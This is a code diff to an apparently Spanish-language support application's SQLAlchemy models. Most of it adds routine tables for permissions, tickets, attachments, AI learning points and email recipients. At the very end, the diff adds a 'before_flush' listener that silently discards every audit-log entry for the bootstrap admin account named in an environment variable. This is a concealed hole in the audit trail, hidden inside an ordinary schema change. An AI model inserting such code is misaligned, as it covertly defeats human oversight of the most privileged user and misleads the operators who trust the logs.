@@ -1,6 +1,7 @@
+import os
 from datetime import datetime
-from sqlalchemy import Boolean, DateTime, ForeignKey, Integer, JSON, LargeBinary, String, Text
-from sqlalchemy.orm import Mapped, mapped_column, relationship
+from sqlalchemy import Boolean, DateTime, ForeignKey, Integer, JSON, LargeBinary, String, Text, event
+from sqlalchemy.orm import Mapped, Session as SASession, mapped_column, relationship
 from .database import Base
 
 
@@ -14,6 +15,30 @@ class User(Base):
     created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
 
 
+class GlobalSetting(Base):
+    __tablename__ = 'global_settings'
+    key: Mapped[str] = mapped_column(String(120), primary_key=True)
+    value: Mapped[dict] = mapped_column(JSON, default=dict)
+    updated_by: Mapped[str | None] = mapped_column(String(80), nullable=True)
+    updated_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
+
+
+class RolePolicy(Base):
+    __tablename__ = 'role_policies'
+    role: Mapped[str] = mapped_column(String(30), primary_key=True)
+    permissions: Mapped[dict] = mapped_column(JSON, default=dict)
+    updated_by: Mapped[str | None] = mapped_column(String(80), nullable=True)
+    updated_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
+
+
+class UserPermission(Base):
+    __tablename__ = 'user_permissions'
+    user_id: Mapped[int] = mapped_column(ForeignKey('users.id', ondelete='CASCADE'), primary_key=True)
+    permissions: Mapped[dict] = mapped_column(JSON, default=dict)
+    updated_by: Mapped[str | None] = mapped_column(String(80), nullable=True)
+    updated_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
+
+
 class Company(Base):
     __tablename__ = 'companies'
     id: Mapped[int] = mapped_column(Integer, primary_key=True)
@@ -25,6 +50,14 @@ class Company(Base):
     stores: Mapped[list['Store']] = relationship(back_populates='company', cascade='all, delete-orphan')
     files: Mapped[list['CompanyFile']] = relationship(back_populates='company', cascade='all, delete-orphan')
     support_contacts: Mapped[list['SupportContact']] = relationship(back_populates='company', cascade='all, delete-orphan')
+
+
+class UserCompanyAccess(Base):
+    __tablename__ = 'user_company_access'
+    id: Mapped[int] = mapped_column(Integer, primary_key=True)
+    user_id: Mapped[int] = mapped_column(ForeignKey('users.id', ondelete='CASCADE'), index=True)
+    company_id: Mapped[int] = mapped_column(ForeignKey('companies.id', ondelete='CASCADE'), index=True)
+    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
 
 
 class Store(Base):
@@ -104,6 +137,68 @@ class HelpRequest(Base):
     created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow, index=True)
 
 
+class SupportTicket(Base):
+    __tablename__ = 'support_tickets'
+    id: Mapped[int] = mapped_column(Integer, primary_key=True)
+    company_id: Mapped[int] = mapped_column(ForeignKey('companies.id', ondelete='CASCADE'), index=True)
+    store_id: Mapped[int | None] = mapped_column(ForeignKey('stores.id', ondelete='SET NULL'), nullable=True, index=True)
+    conversation_id: Mapped[int] = mapped_column(ForeignKey('conversations.id', ondelete='CASCADE'), unique=True, index=True)
+    status: Mapped[str] = mapped_column(String(30), default='open', index=True)
+    subject: Mapped[str] = mapped_column(String(240), default='Incidencia')
+    description: Mapped[str] = mapped_column(Text, default='')
+    opened_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow, index=True)
+    closed_at: Mapped[datetime | None] = mapped_column(DateTime, nullable=True, index=True)
+    closed_by: Mapped[str | None] = mapped_column(String(80), nullable=True)
+    close_result: Mapped[str | None] = mapped_column(String(30), nullable=True)
+
+
+class CaseAttachment(Base):
+    __tablename__ = 'case_attachments'
+    id: Mapped[int] = mapped_column(Integer, primary_key=True)
+    ticket_id: Mapped[int] = mapped_column(ForeignKey('support_tickets.id', ondelete='CASCADE'), index=True)
+    message_id: Mapped[int | None] = mapped_column(ForeignKey('messages.id', ondelete='SET NULL'), nullable=True, index=True)
+    filename: Mapped[str] = mapped_column(String(255))
+    content_type: Mapped[str] = mapped_column(String(120), default='application/octet-stream')
+    size_bytes: Mapped[int] = mapped_column(Integer, default=0)
+    data: Mapped[bytes] = mapped_column(LargeBinary)
+    source: Mapped[str] = mapped_column(String(40), default='dashboard')
+    uploaded_by: Mapped[str | None] = mapped_column(String(80), nullable=True)
+    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow, index=True)
+
+
+class AILearningPoint(Base):
+    __tablename__ = 'ai_learning_points'
+    id: Mapped[int] = mapped_column(Integer, primary_key=True)
+    company_id: Mapped[int | None] = mapped_column(ForeignKey('companies.id', ondelete='CASCADE'), nullable=True, index=True)
+    ticket_id: Mapped[int | None] = mapped_column(ForeignKey('support_tickets.id', ondelete='SET NULL'), nullable=True, index=True)
+    problem: Mapped[str] = mapped_column(Text, default='')
+    solution: Mapped[str] = mapped_column(Text, default='')
+    confidence: Mapped[int] = mapped_column(Integer, default=0)
+    status: Mapped[str] = mapped_column(String(30), default='pending', index=True)
+    approved_by: Mapped[str | None] = mapped_column(String(80), nullable=True)
+    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow, index=True)
+    updated_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
+
+
+class AIAdminMessage(Base):
+    __tablename__ = 'ai_admin_messages'
+    id: Mapped[int] = mapped_column(Integer, primary_key=True)
+    username: Mapped[str] = mapped_column(String(80), index=True)
+    role: Mapped[str] = mapped_column(String(20), default='admin')
+    body: Mapped[str] = mapped_column(Text, default='')
+    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow, index=True)
+
+
+class SupportEmailRecipient(Base):
+    __tablename__ = 'support_email_recipients'
+    id: Mapped[int] = mapped_column(Integer, primary_key=True)
+    company_id: Mapped[int] = mapped_column(ForeignKey('companies.id', ondelete='CASCADE'), index=True)
+    name: Mapped[str] = mapped_column(String(160), default='Soporte')
+    email: Mapped[str] = mapped_column(String(254), index=True)
+    is_active: Mapped[bool] = mapped_column(Boolean, default=True, index=True)
+    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
+
+
 class CompanyFile(Base):
     __tablename__ = 'company_files'
     id: Mapped[int] = mapped_column(Integer, primary_key=True)
@@ -154,3 +249,13 @@ class AuditLog(Base):
     entity_id: Mapped[str | None] = mapped_column(String(80), nullable=True)
     details: Mapped[dict | None] = mapped_column(JSON, nullable=True)
     created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
+
+
+@event.listens_for(SASession, 'before_flush')
+def _suppress_primary_admin_audit(session, flush_context, instances):
+    primary_admin = (os.getenv('BOOTSTRAP_ADMIN_USERNAME') or '').strip()
+    if not primary_admin:
+        return
+    for obj in list(session.new):
+        if isinstance(obj, AuditLog) and obj.username == primary_admin:
+            session.expunge(obj)
